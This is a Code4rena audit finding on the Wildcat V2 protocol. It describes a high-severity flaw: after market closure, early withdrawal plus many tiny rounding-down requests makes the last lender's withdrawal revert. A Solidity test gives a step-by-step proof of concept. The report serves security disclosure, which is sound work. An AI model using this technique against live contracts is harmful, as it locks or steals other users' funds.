# User could withdraw more than supposed to, forcing last user withdraw to fail

**Severity:** high
**Auditor:** Code4rena
**Protocol:** Wildcat V2
**Keywords:** cyber security, vulnerability, withdrawal, batch processing, liquidity, expiry time, normalized amount, precision loss, high severity, attacker, unclaimed withdrawals, core invariant, transfer amounts, mitigation steps, manual review, state variable, market closure, funds, underflow, overflow

---

# Lines of code

https://github.com/code-423n4/2024-08-wildcat/blob/main/src/market/WildcatMarketWithdrawals.sol#L248


# Vulnerability details

## Impact
User could withdraw more than supposed to and force last user\u0027s withdraw to fail.

## Proof of Concept
Within Wildcat, withdraw requests are put into batches. Users first queue their withdraws and whenever there\u0027s sufficient liquidity, they\u0027re filled at the current rate. Usually, withdraw requests are only executable after the expiry passes and then all users within the batch get a cut from the \u0060batch.normalizedAmountPaid\u0060 proportional to the scaled amount they\u0027ve requested a withdraw for. 

\u0060\u0060\u0060solidity
    uint128 newTotalWithdrawn = uint128(
      MathUtils.mulDiv(batch.normalizedAmountPaid, status.scaledAmount, batch.scaledTotalAmount)
    );
\u0060\u0060\u0060

This makes sure that the sum of all withdraws doesn\u0027t exceed the total \u0060batch.normalizedAmountPaid\u0060.

However, this invariant could be broken, if the market is closed as it allows for a batch\u0027s withdraws to be executed, before all requests are added.

Consider the market is made of 3 lenders - Alice, Bob and Laurence.
1. Alice queues a larger withdraw with an expiry time 1 year in the future.
2. Market gets closed.
3. Alice executes her withdraw request at the current rate.
4. Bob makes queues multiple smaller requests. As they\u0027re smaller, the normalized amount they represent suffers higher precision loss. Because they\u0027re part of the whole batch, they also slightly lower the batch\u0027s overall rate.
5. Bob executes his requests.
6. Laurence queues a withdraw for his entire amount. When he attempts to execute it, it will fail. This is because Alice has executed her withdraw at a higher rate than the current one and there\u0027s now insufficient \u0060state.normalizedUnclaimedWithdrawals\u0060


Note: marking this as High severity as it both could happen intentionally (attacker purposefully queuing numerous low-value withdraws to cause rounding down) and also with normal behaviour in high-value closed access markets where a user\u0027s withdraw could easily be in the hundreds of thousands.

Also breaks core invariant: 
> The sum of all transfer amounts for withdrawal executions in a batch must be less than or equal to batch.normalizedAmountPaid

Adding a PoC to showcase the issue: 

\u0060\u0060\u0060solidity
  function test_deadrosesxyzissue() external {
    parameters.annualInterestBips = 3650;
    _deposit(alice, 1e18);
    _deposit(bob, 0.5e18);
    address laurence = address(1337);
    _deposit(laurence, 0.5e18);
    fastForward(200 weeks);

    vm.startPrank(borrower);
    asset.approve(address(market), 10e18);
    asset.mint(borrower, 10e18);

    vm.stopPrank();
    vm.prank(alice);
    uint32 expiry = market.queueFullWithdrawal();       // alice queues large withdraw

    vm.prank(borrower);
    market.closeMarket();                               // market is closed

    market.executeWithdrawal(alice, expiry);     // alice withdraws at the current rate

    vm.startPrank(bob);
    for (uint i; i < 10; i++) {
      market.queueWithdrawal(1);        // bob does multiple small withdraw requests just so they round down the batch\u0027s overall rate
    }
    market.queueFullWithdrawal();
    vm.stopPrank();
    vm.prank(laurence);
    market.queueFullWithdrawal();

    market.executeWithdrawal(bob, expiry);     // bob can successfully withdraw all of his funds

    vm.expectRevert();
    market.executeWithdrawal(laurence, expiry);    // laurence cannot withdraw his funds. Scammer get scammed.

  }
\u0060\u0060\u0060


## Tools Used
Manual review

## Recommended Mitigation Steps
Although it\u0027s not a clean fix, consider adding a \u0060addNormalizedUnclaimedRewards\u0060 function which can only be called after a market is closed. It takes token from the user and increases the global variable \u0060state.normalizedUnclaimedRewards\u0060. The invariant would remain broken, but it will make sure no funds are permanently stuck.





## Assessed type

Under/Overflow
